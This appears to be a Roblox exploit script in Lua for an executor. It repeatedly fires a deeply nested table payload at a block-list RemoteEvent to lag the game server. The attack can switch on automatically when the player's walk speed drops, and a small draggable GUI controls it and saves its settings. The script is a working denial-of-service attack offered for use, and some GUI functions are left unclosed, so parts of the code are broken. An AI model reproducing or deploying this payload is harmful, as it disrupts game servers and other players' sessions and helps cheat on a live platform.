local function formatAssetId(id)
    if not id or id == "" then return "" end
    local cleanId = tostring(id):gsub("%D", "")
    return "rbxthumb://type=Asset&id=" .. cleanId .. "&w=420&h=420"
end

local function resolveKey(name)
	if not name or name == "" or name == "None" then return nil end
	local ok, val = pcall(function() return Enum.KeyCode[name] end)
	return (ok and val) or nil
end

local function saveConfig()
	local ok, encoded = pcall(function() return HttpService:JSONEncode(cfg) end)
	if ok and encoded and writefile then
		pcall(writefile, CONFIG_FILE, encoded)
	end
end

local function loadConfig()
	if not (isfile and readfile and isfile(CONFIG_FILE)) then return end
	local ok, data = pcall(function() return HttpService:JSONDecode(readfile(CONFIG_FILE)) end)
	if not ok or type(data) ~= "table" then return end

	cfg.power          = tonumber(data.power) or DEFAULT_CFG.power
	cfg.interval       = tonumber(data.interval) or DEFAULT_CFG.interval
	cfg.keybind        = type(data.keybind) == "string" and data.keybind or DEFAULT_CFG.keybind
	cfg.controllerBind = type(data.controllerBind) == "string" and data.controllerBind or DEFAULT_CFG.controllerBind
    cfg.autoBrainrot   = type(data.autoBrainrot) == "boolean" and data.autoBrainrot or DEFAULT_CFG.autoBrainrot
    cfg.background     = type(data.background) == "string" and data.background or DEFAULT_CFG.background
end

loadConfig()

local function findRemote()
	local rrs = game:FindFirstChild("RobloxReplicatedStorage")
	if not rrs then return nil end
	local rem
	for _, name in ipairs({"SetPlayerBlockList", "UpdatePlayerBlockList", "SetBlockList", "UpdateBlockList"}) do
		local r = rrs:FindFirstChild(name)
		if r and r:IsA("RemoteEvent") then rem = r break end
	end
	if not rem then
		for _, c in ipairs(rrs:GetChildren()) do
			if c:IsA("RemoteEvent") and c.Name:find("Block") then rem = c break end
		end
	end
	return rem
end

remote = findRemote()

local function buildPayload(power)
	local main = {}
	local nested = {{}}
	local current = nested[1]
	for _ = 1, 186 do
		local n = {}
		table.insert(current, n)
		current = n
	end
	local maxRep = math.min(math.floor(power / 188), 10000)
	for _ = 1, maxRep do
		table.insert(main, nested)
	end
	return main
end

local loopTask = nil
local function setLag(state)
	active = state
	if active then
		if not remote or not remote.Parent then
			remote = findRemote()
		end
		if loopTask then pcall(task.cancel, loopTask) end
		local payload = buildPayload(cfg.power)
		loopTask = task.spawn(function()
			local currentDelay = cfg.interval
			while active do
				if not remote or not remote.Parent then
					remote = findRemote()
					if not remote then task.wait(0.5) continue end
				end
				local ok = pcall(function()
					remote:FireServer(payload)
				end)
				if not ok then
					currentDelay = math.min(currentDelay * 1.5, 0.5)
				else
					currentDelay = math.max(currentDelay * 0.995, 0.05)
				end
				task.wait(currentDelay)
			end
		end)
	else
		if loopTask then pcall(task.cancel, loopTask) end
		loopTask = nil
	end
end

-- AUTO ACTIVATE DETECTION (WalkSpeed < 25)
-------------------------------------------------
RunService.Heartbeat:Connect(function()
	if not cfg.autoBrainrot then
		if brainrotMode then
			brainrotMode = false
			lastBrainrotState = false
		end
		return
	end

	local char = plr.Character
	if not char then return end
	local hum = char:FindFirstChildOfClass("Humanoid")
	if not hum then return end

	local hasBrainrot = hum.WalkSpeed < 25

	if hasBrainrot and not lastBrainrotState then
		brainrotMode = true
		lastBrainrotState = true
		manualOverride = false
		if not active then
			setLag(true)
			if refreshUI then refreshUI() end
		end
	elseif not hasBrainrot and lastBrainrotState then
		brainrotMode = false
		lastBrainrotState = false
		manualOverride = false
		if active then
			setLag(false)
			if refreshUI then refreshUI() end
		end
	end
end)

local function makeMenuDraggable()
	local dragging, dragStart, startAbsPos = false, nil, nil
	frame.InputBegan:Connect(function(input)
		if uiLocked then return end
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startAbsPos = frame.AbsolutePosition
		end
	end)
	UserInputService.InputChanged:Connect(function(input)
		if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
			local delta = input.Position - dragStart
			local viewport = workspace.CurrentCamera.ViewportSize
			local EDGE_VISIBLE = 46

			local minX = -frame.AbsoluteSize.X + EDGE_VISIBLE
			local maxX = viewport.X - EDGE_VISIBLE
			local newX = math.clamp(startAbsPos.X + delta.X, minX, maxX)
			local newY = math.clamp(startAbsPos.Y + delta.Y, 0, viewport.Y - frame.AbsoluteSize.Y)

			frame.Position = UDim2.new(0, newX, 0, newY)
		end
	end)

-- make the settings & BG windows draggable on their own
local panelMoved = {}

local function makePanelDraggable(panel)
	local dragging, dragStart, startAbsPos = false, nil, nil
	panel.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			panelMoved[panel] = true
			dragging = true
			dragStart = input.Position
			startAbsPos = panel.AbsolutePosition
		end
	end)
	UserInputService.InputChanged:Connect(function(input)
		if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
			local delta = input.Position - dragStart
			local viewport = workspace.CurrentCamera.ViewportSize
			local newX = math.clamp(startAbsPos.X + delta.X, 0, viewport.X - panel.AbsoluteSize.X)
			local newY = math.clamp(startAbsPos.Y + delta.Y, 0, viewport.Y - panel.AbsoluteSize.Y)
			panel.Position = UDim2.new(0, newX, 0, newY)
		end
	end)
	UserInputService.InputEnded:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = false
		end
	end)
end
makePanelDraggable(settingsPanel)
makePanelDraggable(bgPanel)

-- place side panels next to the main menu (follows it until you drag them)
local function placePanels()
	local p = frame.AbsolutePosition
	local sz = frame.AbsoluteSize
	local vp = workspace.CurrentCamera.ViewportSize
	local function place(panel, yOff)
		if panelMoved[panel] then return end
		local x = p.X + sz.X + 6
		if x + panel.AbsoluteSize.X > vp.X then x = p.X - panel.AbsoluteSize.X - 6 end
		panel.Position = UDim2.new(0, x, 0, p.Y + yOff)
	end
	place(settingsPanel, 0)
	place(bgPanel, settingsPanel.Visible and (settingsPanel.AbsoluteSize.Y + 6) or 0)
end
frame:GetPropertyChangedSignal("AbsolutePosition"):Connect(placePanels)
frame:GetPropertyChangedSignal("Visible"):Connect(function()
	if not frame.Visible then settingsPanel.Visible = false bgPanel.Visible = false end
end)

closeBtn.MouseButton1Click:Connect(function()
	settingsOpen = not settingsOpen
	settingsPanel.Visible = settingsOpen
	placePanels()
end)

bgBtn.MouseButton1Click:Connect(function()
	bgPanel.Visible = not bgPanel.Visible
	bgBtn.BackgroundColor3 = bgPanel.Visible and THEME_GRAY or BTN_INACTIVE

UserInputService.InputBegan:Connect(function(input, processed)
	local kc = input.KeyCode
	
	if listeningForGamepad then
		if input.UserInputType == Enum.UserInputType.Gamepad1 then
			cfg.controllerBind = kc.Name
			listeningForGamepad = false
			saveConfig()
			refreshUI()
			return
		elseif kc == Enum.KeyCode.Escape then
			listeningForGamepad = false
			refreshUI()
			return
		end
	end

	if kc == Enum.KeyCode.Unknown then return end
	if listeningFor then
		if kc == Enum.KeyCode.Escape then listeningFor = false refreshUI() return end
		if not BLACKLISTED[kc] then cfg.keybind = kc.Name listeningFor = false saveConfig() refreshUI() end
		return
	end
	if processed then return end

	local keyEnum = resolveKey(cfg.keybind)
	if keyEnum and kc == keyEnum then
		active = not active
		manualOverride = not active
		setLag(active)
		refreshUI()
		return
	end

	if input.UserInputType == Enum.UserInputType.Gamepad1 and kc.Name == cfg.controllerBind then
		active = not active
		manualOverride = not active
		setLag(active)
		refreshUI()
	end
end)
